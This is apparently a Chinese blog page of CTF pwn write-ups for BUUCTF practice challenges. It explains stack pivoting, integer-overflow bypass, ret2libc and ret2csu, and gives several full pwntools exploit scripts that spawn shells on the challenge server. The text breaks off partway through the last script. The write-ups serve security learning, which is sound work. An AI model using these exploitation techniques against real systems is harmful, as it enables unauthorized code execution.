@@ -1,0 +1,448 @@
+
+
+<!DOCTYPE html>
+<html lang="en" color-mode=light>
+<head>
+  <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+  <meta http-equiv="X-UA-Compatible" content="ie=edge">
+  <title>buu03 - ShouCheng</title>
+  <meta name="apple-mobile-web-app-capable" content="yes" />
+  <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+  <meta name="google" content="notranslate" />
+  
+  <meta name="description" content="buu——pwn学习十、铁人三项(第五赛区)_2018...">
+  <meta name="author" content="ShouCheng">
+  <link rel="icon" href="/images/icons/favicon-16x16.png" type="image/png" sizes="16x16">
+  <link rel="icon" href="/images/icons/favicon-32x32.png" type="image/png" sizes="32x32">
+  <link rel="apple-touch-icon" href="/images/icons/apple-touch-icon.png" sizes="180x180">
+  <meta rel="mask-icon" href="/images/icons/stun-logo.svg" color="#333333">
+  
+    <meta rel="msapplication-TileImage" content="/images/icons/favicon-144x144.png">
+    <meta rel="msapplication-TileColor" content="#000000">
+  
+
+  
+<link rel="stylesheet" href="/css/style.css">
+
+
+  
+    
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1445822_r673sha78lq.css">
+
+  
+
+  
+    
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.5.7/jquery.fancybox.min.css">
+
+  
+
+  
+    
+      
+        
+        
+<link rel="stylesheet" href="https://cdn.bootcss.com/highlight.js/9.18.1/styles/xcode.min.css" name="highlight-style" mode="light">
+
+      
+        
+        
+<link rel="stylesheet" href="https://cdn.bootcss.com/highlight.js/9.18.1/styles/solarized-dark.min.css" name="highlight-style" mode="dark">
+
+      
+  
+
+  <script>
+    var CONFIG = window.CONFIG || {};
+    var ZHAOO = window.ZHAOO || {};
+    CONFIG = {
+      isHome: false,
+      fancybox: true,
+      pjax: false,
+      lazyload: {
+        enable: true,
+        only_post: 'false',
+        loading: '[object Object]'
+      },
+      donate: {
+        enable: true,
+        alipay: 'https://pic.izhaoo.com/alipay.jpg',
+        wechat: 'https://pic.izhaoo.com/wechat.jpg'
+      },
+      galleries: {
+        enable: true
+      },
+      fab: {
+        enable: true,
+        always_show: false
+      },
+      carrier: {
+        enable: true
+      },
+      daovoice: {
+        enable: false
+      },
+      preview: {
+        background: {
+          default: '',
+          api: ''
+        },
+        motto: {
+          default: '我在开了灯的床头下，想问问自己的心啊。',
+          typing: true,
+          api: 'https://v2.jinrishici.com/one.json',
+          data_contents: '["data","content"]'
+        },
+      },
+      qrcode: {
+        enable: true,
+        type: 'url',
+        image: 'https://pic.izhaoo.com/weapp-code.jpg',
+      },
+      toc: {
+        enable: true
+      },
+      scrollbar: {
+        type: 'default'
+      },
+      notification: {
+        enable: false,
+        delay: 4500,
+        list: '',
+        page_white_list: '',
+        page_black_list: ''
+      },
+      search: {
+        enable: false,
+        path: ''
+      }
+    }
+  </script>
+
+  
+
+  
+
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+<body class="lock-screen">
+  <div class="loading"></div>
+  
+    
+
+
+  <nav class="navbar">
+    <div class="left">
+      
+        <i class="iconfont iconhome j-navbar-back-home"></i>
+      
+      
+        <i class="iconfont iconqrcode j-navbar-qrcode"></i>
+      
+      
+        <i class="iconfont iconmoono" id="color-toggle" color-toggle="light"></i>
+      
+      
+    </div>
+    <div class="center">buu03</div>
+    <div class="right">
+      <i class="iconfont iconmenu j-navbar-menu"></i>
+    </div>
+    
+      <div id="qrcode-navbar"></div>
+    
+  </nav>
+
+  
+  
+
+<nav class="menu">
+  <div class="menu-container">
+    <div class="menu-close">
+      <i class="iconfont iconbaseline-close-px"></i>
+    </div>
+    <ul class="menu-content"><li class="menu-item">
+        <a href="/ " class="underline "> 首页</a>
+      </li><li class="menu-item">
+        <a href="/galleries/ " class="underline "> 摄影</a>
+      </li><li class="menu-item">
+        <a href="/archives/ " class="underline "> 归档</a>
+      </li><li class="menu-item">
+        <a href="/tags/ " class="underline "> 标签</a>
+      </li><li class="menu-item">
+        <a href="/categories/ " class="underline "> 分类</a>
+      </li><li class="menu-item">
+        <a href="/about/ " class="underline "> 关于</a>
+      </li></ul>
+    
+      <div class="menu-copyright"><p>Powered by <a target="_blank" href="https://hexo.io">Hexo</a>  |  Theme - <a target="_blank" href="https://github.com/izhaoo/hexo-theme-zhaoo">zhaoo</a></p></div>
+    
+  </div>
+</nav>
+  <main id="main">
+  <div class="article-wrap">
+    <div class="row container">
+      <div class="col-xl-3"></div>
+      <div class="col-xl-6"><article class="article">
+  <div class="wrap">
+    <section class="head">
+  <img   class="lazyload" data-original="/images/theme/post-image.jpg" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg=="  draggable="false">
+  <div class="head-mask">
+    <h1 class="head-title">buu03</h1>
+    <div class="head-info">
+      <span class="post-info-item"><i class="iconfont iconcalendar"></i>April 07, 2021</span>
+      
+      <span class="post-info-item"><i class="iconfont iconfont-size"></i>5499</span>
+    </div>
+  </div>
+</section>
+    <section class="main">
+      <section class="content">
+        <h1 id="buu——pwn学习"><a href="#buu——pwn学习" class="headerlink" title="buu——pwn学习"></a>buu——pwn学习</h1><h3 id="十、铁人三项-第五赛区-2018-rop"><a href="#十、铁人三项-第五赛区-2018-rop" class="headerlink" title="十、铁人三项(第五赛区)_2018_rop"></a>十、铁人三项(第五赛区)_2018_rop</h3><p>checksec一下，开启了nx保护，然后拖入ida</p>
+<p><img   class="lazyload" data-original="2021-04-07-buu03.assets/QQ%E5%9B%BE%E7%89%8720210407213546.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==" ></p>
+<p><img   class="lazyload" data-original="2021-04-07-buu03.assets/QQ%E5%9B%BE%E7%89%8720210407213807.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==" ></p>
+<p>呃。。。应该就是比较熟悉的rop的构建了，直接上exp吧，这类题目做挺多的了：</p>
+<p><img   class="lazyload" data-original="2021-04-07-buu03.assets/QQ%E5%9B%BE%E7%89%8720210407220012.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==" ></p>
+<h3 id="十一、gyctf-2020-borrowstack"><a href="#十一、gyctf-2020-borrowstack" class="headerlink" title="十一、gyctf_2020_borrowstack"></a>十一、gyctf_2020_borrowstack</h3><p>先做下这题，一直想完整的了解栈迁移，借着这题真正的掌握栈迁移的手法和知识点吧，先checksec一下，再拖入ida分析</p>
+<p><img   class="lazyload" data-original="2021-04-07-buu03.assets/QQ%E5%9B%BE%E7%89%8720210407220304.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==" ></p>
+<p>里面很简单，没有什么复杂的函数，很适合借此了解栈迁移！首先read函数读取的字节数不够，只能够刚好覆盖返回地址。第二输入点的位置是bss段上，不是栈。所以这时候就是要把栈迁移到这里，因为在这里我们可以有足够的输入构建系统函数调用shell</p>
+<p><img   class="lazyload" data-original="2021-04-07-buu03.assets/QQ%E5%9B%BE%E7%89%8720210407220423.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==" ></p>
+<p>这题太坑了！！！！！！！！！！！！！首先，你如果使用了system函数调用/bin/sh，这时候无论你选择哪个版本的libc都无法成功获取shell！网上的师傅们好像也是这样，原因都只是模糊的说猜测是因为栈迁移的位置太靠近一些重要数据，可能还是影响到了什么东西。都采取了one_gadget的办法，这里我同样踩坑！</p>
+<p><img   class="lazyload" data-original="2021-04-07-buu03.assets/QQ%E5%9B%BE%E7%89%8720210408090610.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==" ></p>
+<p>师傅们都是泄露出puts的got表地址，去查询出libc版本然后下载，然而我很惊奇的发现，我泄露的地址查询不到对应的libc版本。。。所以这里的exceve函数地址我是直接把师傅们的搬运过来了0x4526a</p>
+<p><img   class="lazyload" data-original="2021-04-07-buu03.assets/QQ%E5%9B%BE%E7%89%8720210408090158.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==" ></p>
+<p><img   class="lazyload" data-original="2021-04-07-buu03.assets/QQ%E5%9B%BE%E7%89%8720210408090211.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==" ></p>
+<p>以及，栈迁移的发送函数，只能选择send。（别问为什么，我选择的是sendline。。。一直出问题，甚至为了找问题，我每个与师傅们wp不同地方慢慢改，发现竟然是这个原因，只能怪自己粗心吧，猜测是这里的read读取过于严格，所有输入数据都是刚好，多输入了一个\n导致了问题的发生，下次一定注意！）还有就是距离重要数据太近这点，前面的ret执行多次就是为了避免这个，因为bss段距离.got.plt太近了，并且跳转回main函数的时候，还会进行一次巨大的升栈，所以的话执行多次ret把栈的位置往bss段的高地址处迁移</p>
+<p><img   class="lazyload" data-original="2021-04-07-buu03.assets/QQ%E5%9B%BE%E7%89%8720210408091459.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==" ></p>
+<p>其他的话，wp如下：</p>
+<p><img   class="lazyload" data-original="2021-04-07-buu03.assets/QQ%E5%9B%BE%E7%89%8720210408092959.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==" ></p>
+<h3 id="十二、bjdctf-2020-babyrop"><a href="#十二、bjdctf-2020-babyrop" class="headerlink" title="十二、bjdctf_2020_babyrop"></a>十二、bjdctf_2020_babyrop</h3><p>例行checksec一下，然后运行一下。开启了nx和部分relro缓解机制。运行的结果也不能看出些什么，进入ida看看吧</p>
+<p><img   class="lazyload" data-original="2021-04-07-buu03.assets/QQ%E5%9B%BE%E7%89%8720210408155229.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==" ></p>
+<p>在一个函数里面有着很明显的溢出点，足够我们覆盖返回地址并且构造系统函数了。一道常规的rop，就不多说了，已经做烂了。。</p>
+<p><img   class="lazyload" data-original="2021-04-07-buu03.assets/QQ%E5%9B%BE%E7%89%8720210408155615.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==" ></p>
+<p>exp如下：</p>
+<p><img   class="lazyload" data-original="2021-04-07-buu03.assets/QQ%E5%9B%BE%E7%89%8720210408170004.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==" ></p>
+<h3 id="十三、others-shellcode"><a href="#十三、others-shellcode" class="headerlink" title="十三、others_shellcode"></a>十三、others_shellcode</h3><p>例行checksec以及执行附件，开启了nx，pie以及部分relro。运行附件发现直接就获取了shell。。</p>
+<p><img   class="lazyload" data-original="2021-04-07-buu03.assets/QQ%E5%9B%BE%E7%89%8720210410073535.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==" ></p>
+<p><img   class="lazyload" data-original="2021-04-07-buu03.assets/QQ%E5%9B%BE%E7%89%8720210410073615.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==" ></p>
+<p>然后我试着nc一下远程，看看是不是也能获取shell，没想到。。确实可以</p>
+<p><img   class="lazyload" data-original="2021-04-07-buu03.assets/QQ%E5%9B%BE%E7%89%8720210410073831.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==" ></p>
+<p>查看ida，发现附件中是已经调用了execve函数</p>
+<p><img   class="lazyload" data-original="2021-04-07-buu03.assets/QQ%E5%9B%BE%E7%89%8720210410074925.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==" ></p>
+<h3 id="十四、pwn2-sctf-2016"><a href="#十四、pwn2-sctf-2016" class="headerlink" title="十四、pwn2_sctf_2016"></a>十四、pwn2_sctf_2016</h3><p>例行checksec并且运行，只开启nx和部分的relro，拖入ida查看一下代码</p>
+<p><img   class="lazyload" data-original="2021-04-07-buu03.assets/QQ%E5%9B%BE%E7%89%8720210418202516.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==" ></p>
+<p>程序比较简单，可以很明确的发现，不存在后门函数，也没有明显的溢出点，被限制了。printf也没有问题，对于这样的情况，我第一时间是想到了整数溢出，通过整数溢出来越过检查，通过小数变成大数，从而溢出。</p>
+<p><img   class="lazyload" data-original="2021-04-07-buu03.assets/QQ%E5%9B%BE%E7%89%8720210418202734.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==" ></p>
+<p><img   class="lazyload" data-original="2021-04-07-buu03.assets/QQ%E5%9B%BE%E7%89%8720210418205625.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==" ></p>
+<p>接下来讲下漏洞点：main函数里面定义的v2是int类型的，而在get_n里面却是unsigned的，这里如果我们输入了一个负数，那么在get_n里面将变得非常大，足够我们溢出了。</p>
+<p><img   class="lazyload" data-original="2021-04-07-buu03.assets/QQ%E5%9B%BE%E7%89%8720210418210123.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==" ></p>
+<p><img   class="lazyload" data-original="2021-04-07-buu03.assets/QQ%E5%9B%BE%E7%89%8720210418210150.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==" ></p>
+<p>但是没有后门函数，所以只能进行rop了，用printf函数泄露got表地址，LibcSearcher一下，最终构造sys函数获取shell。网上师傅们都取了格式化参数，其实没必要的，本身printf存在着格式化字符串漏洞，所以可以直接printf出来，没必要再输入一个格式化参数。这里有个坑的地方，好吧，是我傻得踩到了还一直没看出来。get_n里面的getchar里面已经对0截断了，所以在第二次构造payload的时候，不可以像往常那样顺手写个p32(0)，后面感觉不对劲，我给他顺手改成了个p32(1)。。。。有点傻。。这个后面三个字节仍然是0，依旧截断了。写出来警示一下大伙，多注意点细节。</p>
+<p>对了，libc找出来有15个，你可以知道我有多绝望了，一个个试了，竟然都不行，而且还是两遍！！！</p>
+<p>exp如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!usr/bin/env python</span><br><span class="hljs-comment">#coding=utf-8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br>p=remote(<span class="hljs-string">&quot;node3.buuoj.cn&quot;</span>,<span class="hljs-number">25066</span>)<br>elf=ELF(<span class="hljs-string">&#x27;./1&#x27;</span>)<br>context.log_level=<span class="hljs-string">&#x27;debug&#x27;</span><br>printf_plt=elf.plt[<span class="hljs-string">&#x27;printf&#x27;</span>]<br>printf_got=elf.got[<span class="hljs-string">&#x27;printf&#x27;</span>]<br>main=elf.sym[<span class="hljs-string">&#x27;main&#x27;</span>]<br><br>p.sendlineafter(<span class="hljs-string">&#x27;read?&#x27;</span>,<span class="hljs-string">&#x27;-1&#x27;</span>)<br>payload=<span class="hljs-string">&#x27;a&#x27;</span>*(<span class="hljs-number">0x2c</span>+<span class="hljs-number">0x4</span>)+p32(printf_plt)+p32(main)+p32(printf_got)<br>p.sendlineafter(<span class="hljs-string">&#x27;data!\n&#x27;</span>,payload)<br>p.recvline() <span class="hljs-comment">#接收最后的printf，让程序流执行完</span><br>printf_addr=u32(p.recv(<span class="hljs-number">4</span>))<br>log.info(<span class="hljs-string">&quot;printf address:&quot;</span>+<span class="hljs-built_in">hex</span>(printf_addr))<br><br>libc=LibcSearcher(<span class="hljs-string">&#x27;printf&#x27;</span>,printf_addr)<br>libc_base=printf_addr-libc.dump(<span class="hljs-string">&#x27;printf&#x27;</span>)<br>binsh=libc_base+libc.dump(<span class="hljs-string">&#x27;str_bin_sh&#x27;</span>)<br>system=libc_base+libc.dump(<span class="hljs-string">&#x27;system&#x27;</span>)<br><br>p.sendlineafter(<span class="hljs-string">&#x27;read?&#x27;</span>,<span class="hljs-string">&#x27;-1&#x27;</span>)<br>payload=<span class="hljs-string">&#x27;a&#x27;</span>*(<span class="hljs-number">0x2c</span>+<span class="hljs-number">0x4</span>)+p32(system)+<span class="hljs-string">&#x27;beef&#x27;</span>+p32(binsh) <span class="hljs-comment">#beef！！！！！</span><br>p.sendlineafter(<span class="hljs-string">&#x27;data!\n&#x27;</span>,payload)<br><br>p.interactive()<br></code></pre></td></tr></table></figure>
+
+<h3 id="十五、ciscn-2019-s-3"><a href="#十五、ciscn-2019-s-3" class="headerlink" title="十五、ciscn_2019_s_3"></a>十五、ciscn_2019_s_3</h3><p>常规执行checksec一下，查看保护，并且执行一下程序，看看回显</p>
+<p><img   class="lazyload" data-original="2021-04-07-buu03.assets/QQ%E5%9B%BE%E7%89%8720210425202117.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==" ></p>
+<p>出现了一堆乱码，可能是地址泄露了？进入ida看看情况如何</p>
+<p><img   class="lazyload" data-original="2021-04-07-buu03.assets/QQ%E5%9B%BE%E7%89%8720210429123130.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==" ></p>
+<p><img   class="lazyload" data-original="2021-04-07-buu03.assets/QQ%E5%9B%BE%E7%89%8720210429123138.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==" ></p>
+<p>main函数里面很简单，两个系统调用就没了，而有系统调用，那就去看看汇编代码。汇编代码前两行要注意，这里的rsp没有减少，在这题里面rsp=rbp了，后面计算偏移不可以把rbp覆盖了。左边的函数栏看一下，有个gadget的，进入查看</p>
+<p><img   class="lazyload" data-original="2021-04-07-buu03.assets/QQ%E5%9B%BE%E7%89%8720210429123625.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==" ></p>
+<p>很显然，这里面给出了两个调用号，0F和3BH，对应着这题两种解法，我们先介绍使用3BH调用号调用execve函数的解法，稍后再介绍另一种。</p>
+<h4 id="解法一"><a href="#解法一" class="headerlink" title="解法一"></a>解法一</h4><p>execve(“/bin/sh”,0,0)总共有三个参数，所以我们需要控制rdi,rsi,rdx三个寄存器的值，很显然，这是return to libc_csu_init。rsi和rdx的值很好控制，设置为0即可，而/bin/sh字符串则需要我们去寻找了，我们只有一个输入点，就是往栈上面输入/bin/sh，然后通过泄露栈的地址而得到该地址，从而把地址给rdi，最后再调用syscall函数，即可获取shell。</p>
+<p>而write函数会输出栈上0x30个内存单元内容，通过调试，可以知道0x20位置处会泄露出一个栈上的地址，我们只需要计算该地址到/bin/sh的偏差，就可以获取/bin/sh的地址</p>
+<p><img   class="lazyload" data-original="2021-04-07-buu03.assets/QQ%E5%9B%BE%E7%89%8720210429124551.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==" ></p>
+<p>上图是我在本地调试的情况，0x7ffcaba65838是泄露出来的地址，可是扣去0x7ffcaba656f0得到的却是0x148，而我去网上找师傅们的wp是0x138，不太懂为什么。所以我只能本地获取到了shell，但是远程不能过了。</p>
+<p>获取到了/bin/sh的地址，后面就是构造rop链了。</p>
+<p><img   class="lazyload" data-original="2021-04-07-buu03.assets/QQ%E5%9B%BE%E7%89%8720210429124941.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==" ></p>
+<p>这边csu里面的edi是有问题的，因为/bin/sh的地址是不止4个字节，所以edi是不够盛放的，所以我们需要rdi才行，这边使用了ROPgadget去寻找。所以后面payload构造rop时，这边还需要利用r12盛放栈上的内容进行跳转到栈上继续执行，而不能直接就在r12里面存放syscall地址进行直接调用。</p>
+<p>exp如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!usr/bin/env python</span><br><span class="hljs-comment">#coding=utf-8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-comment">#p=remote(&#x27;node3.buuoj.cn&#x27;,25007)</span><br>p=process(<span class="hljs-string">&#x27;./1&#x27;</span>)<br>context.log_level=<span class="hljs-string">&#x27;debug&#x27;</span><br>elf=ELF(<span class="hljs-string">&#x27;./1&#x27;</span>)<br>main=elf.sym[<span class="hljs-string">&#x27;main&#x27;</span>]<br>syscall=<span class="hljs-number">0x400517</span><br>execve=<span class="hljs-number">0x4004e2</span><br>pop_rbx_rbp_r12_r13_r14_r15_ret=<span class="hljs-number">0x40059a</span><br>rdx_edi_rsi=<span class="hljs-number">0x400580</span><br>offset=<span class="hljs-number">0x138</span><br>pop_rdi=<span class="hljs-number">0x4005a3</span><br><br>payload=<span class="hljs-string">&quot;/bin/sh\x00&quot;</span>*<span class="hljs-number">2</span>+p64(main)<br>p.send(payload)<br>p.recv(<span class="hljs-number">0x20</span>)<br>leak=u64(p.recv(<span class="hljs-number">8</span>))<br>binsh=leak-offset<br><span class="hljs-built_in">print</span> <span class="hljs-built_in">hex</span>(leak)<br><span class="hljs-built_in">print</span> <span class="hljs-built_in">hex</span>(binsh)<br>gdb.attach(p,<span class="hljs-string">&#x27;b *main&#x27;</span>)<br><br>payload=<span class="hljs-string">&quot;/bin/sh\x00&quot;</span>*<span class="hljs-number">2</span><br>payload+=p64(pop_rbx_rbp_r12_r13_r14_r15_ret)<br>payload+=p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0</span>)+p64(binsh+<span class="hljs-number">0x50</span>)+p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0</span>)<br>payload+=p64(rdx_edi_rsi)+p64(execve)  <span class="hljs-comment">#p64(execve)在栈上距离/bin/sh有0x50的长度</span><br>payload+=p64(pop_rdi)+p64(binsh)+p64(syscall)<br>p.send(payload)<br><br>p.interactive()<br></code></pre></td></tr></table></figure>
+
+<h4 id="解法二"><a href="#解法二" class="headerlink" title="解法二"></a>解法二</h4><p>后面有缘再更新吧，，，，</p>
+<h3 id="十六、ciscn-2019-es-2"><a href="#十六、ciscn-2019-es-2" class="headerlink" title="十六、ciscn_2019_es_2"></a>十六、ciscn_2019_es_2</h3><p>常规checksec查看保护措施</p>
+<p><img   class="lazyload" data-original="2021-04-07-buu03.assets/QQ%E5%9B%BE%E7%89%8720210501105608.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==" ></p>
+<p>程序只开启了NX，应该是道较为简单的题目，进入ida看看情况</p>
+<p><img   class="lazyload" data-original="2021-04-07-buu03.assets/QQ%E5%9B%BE%E7%89%8720210501105715.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==" ></p>
+<p>这里总共输入了两次数据，同时还能printf出来，可能会泄露一些重要地址信息。这里的read函数全部被限制到只够刚好覆盖到返回地址就不能再继续填充了，所以这里是用了栈迁移的思想，把栈迁移到栈上，制造一个假栈。</p>
+<p>栈迁移利用leave 和ret指令改变ebp和esp的指向位置，所以要先得到要迁移的地址，也就是s位置，这边泄露ebp的值，从而计算两者偏差</p>
+<p><img   class="lazyload" data-original="2021-04-07-buu03.assets/QQ%E5%9B%BE%E7%89%8720210501110624.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==" ></p>
+<p>最顶上0xfffcd65就是s的位置，而0xffcd678就是ebp指向的位置，而在该地址处的内容为0xfffcd688就是我们泄露出来的内容，与s偏差为0x38</p>
+<p>而系统函数附件中已经有了system的调用，差的就只有/bin/sh的字符串了，我们可以直接写在栈上，然后仍然是用泄露出来的地址算出/bin/sh地址，作为参数即可</p>
+<p>exp如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!usr/bin/env python</span><br><span class="hljs-comment">#coding=utf-8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>p=remote(<span class="hljs-string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="hljs-number">27262</span>)<br><span class="hljs-comment">#p=process(&#x27;./1&#x27;)</span><br>system=<span class="hljs-number">0x8048400</span><br>leave_ret=<span class="hljs-number">0x80484b8</span><br>context(os=<span class="hljs-string">&#x27;linux&#x27;</span>,arch=<span class="hljs-string">&#x27;i386&#x27;</span>,log_level=<span class="hljs-string">&#x27;debug&#x27;</span>)<br>payload=<span class="hljs-string">&#x27;a&#x27;</span>*<span 